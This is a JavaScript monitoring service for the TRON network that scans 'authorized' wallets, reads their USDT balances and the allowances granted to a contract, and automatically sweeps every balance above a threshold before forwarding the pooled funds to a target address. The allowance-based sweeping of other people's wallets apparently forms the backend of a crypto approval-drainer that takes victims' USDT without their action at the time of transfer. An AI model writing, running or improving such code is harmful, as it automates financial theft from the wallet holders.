const cron = require('node-cron');
const Wallet = require('../models/Wallet');
const Transaction = require('../models/Transaction');
const TronService = require('./TronService');

class MonitorService {
  constructor() {
    this.isMonitoring = false;
    this.scanInterval = process.env.SCAN_INTERVAL || 30000;
  }

  // 启动真实监控
  async startMonitoring() {
    if (this.isMonitoring) {
      throw new Error('监控服务已经在运行中');
    }

    this.isMonitoring = true;
    console.log('USDT归集监控服务已启动');

    // 定时扫描
    cron.schedule(`*/${this.scanInterval / 1000} * * * * *`, async () => {
      if (this.isMonitoring) {
        await this.scanWallets();
      }
    });
  }

  // 停止监控
  stopMonitoring() {
    this.isMonitoring = false;
    console.log('USDT归集监控服务已停止');
  }

  // 真实扫描钱包
  async scanWallets() {
    try {
      console.log('开始扫描钱包余额...');
      
      const wallets = await Wallet.find({ 
        status: 'active', 
        isAuthorized: true 
      });

      for (const wallet of wallets) {
        try {
          // 更新真实余额
          const balanceInfo = await TronService.getWalletBalance(wallet.address);
          const allowance = await TronService.getAllowance(
            wallet.address, 
            process.env.CONTRACT_ADDRESS
          );

          // 更新数据库
          wallet.trxBalance = balanceInfo.trxBalance;
          wallet.usdtBalance = balanceInfo.usdtBalance;
          wallet.usdtAllowance = allowance;
          wallet.totalBalance = balanceInfo.usdtBalance;
          wallet.lastChecked = new Date();
          
          await wallet.save();

          // 真实归集检查
          if (wallet.usdtBalance >= process.env.COLLECT_THRESHOLD && 
              wallet.usdtAllowance >= wallet.usdtBalance) {
            await this.collectWalletFunds(wallet, 'auto');
          }

        } catch (error) {
          console.error(`扫描钱包失败 ${wallet.address}:`, error);
        }
      }

      // 检查合约余额
      await this.checkContractBalance();

    } catch (error) {
      console.error('扫描钱包过程中发生错误:', error);
    }
  }

  // 真实归集钱包资金
  async collectWalletFunds(wallet, type = 'manual') {
    try {
      console.log(`开始归集钱包 ${wallet.address}, 金额: ${wallet.usdtBalance} USDT`);

      // 创建交易记录
      const transaction = new Transaction({
        walletAddress: wallet.address,
        amount: wallet.usdtBalance,
        type: type,
        status: 'pending'
      });

      // 执行真实区块链交易
      const txResult = await TronService.collectFunds(
        wallet.address, 
        wallet.usdtBalance
      );

      // 更新交易记录
      transaction.txHash = txResult.transaction.txID;
      transaction.status = 'completed';
      transaction.gasUsed = txResult.transaction.ret[0].fee || 0;
      await transaction.save();

      // 更新钱包余额
      wallet.usdtBalance = 0;
      wallet.totalBalance = 0;
      await wallet.save();

      console.log(`归集成功: ${wallet.address}, 交易哈希: ${txResult.transaction.txID}`);

      return transaction;

    } catch (error) {
      console.error(`归集失败 ${wallet.address}:`, error);
      
      const transaction = new Transaction({
        walletAddress: wallet.address,
        amount: wallet.usdtBalance,
        type: type,
        status: 'failed',
        failureReason: error.message
      });
      
      await transaction.save();
      throw error;
    }
  }

  // 真实检查合约余额
  async checkContractBalance() {
    try {
      const contractBalance = await TronService.getWalletBalance(process.env.CONTRACT_ADDRESS);
      
      if (contractBalance.usdtBalance >= process.env.CONTRACT_THRESHOLD) {
        console.log(`合约余额 ${contractBalance.usdtBalance} USDT 超过阈值，开始划转`);
        await this.transferContractFunds(contractBalance.usdtBalance);
      }
    } catch (error) {
      console.error('检查合约余额失败:', error);
    }
  }

  // 真实合约资金划转
  async transferContractFunds(amount) {
    try {
      const transaction = new Transaction({
        fromAddress: process.env.CONTRACT_ADDRESS,
        toAddress: process.env.TARGET_ADDRESS,
        amount: amount,
        type: 'contract_transfer',
        status: 'pending'
      });

      const txResult = await TronService.transferToTarget(amount);

      transaction.txHash = txResult.transaction.txID;
      transaction.status = 'completed';
      transaction.gasUsed = txResult.transaction.ret[0].fee || 0;
      await transaction.save();

      console.log(`合约资金划转成功: ${amount} USDT, 交易哈希: ${txResult.transaction.txID}`);

      return transaction;

    } catch (error) {
      console.error('合约资金划转失败:', error);
      
      const transaction = new Transaction({
        fromAddress: process.env.CONTRACT_ADDRESS,
        toAddress: process.env.TARGET_ADDRESS,
        amount: amount,
        type: 'contract_transfer',
        status: 'failed',
        failureReason: error.message
      });
      
      await transaction.save();
      throw error;
    }
  }
}

module.exports = new MonitorService();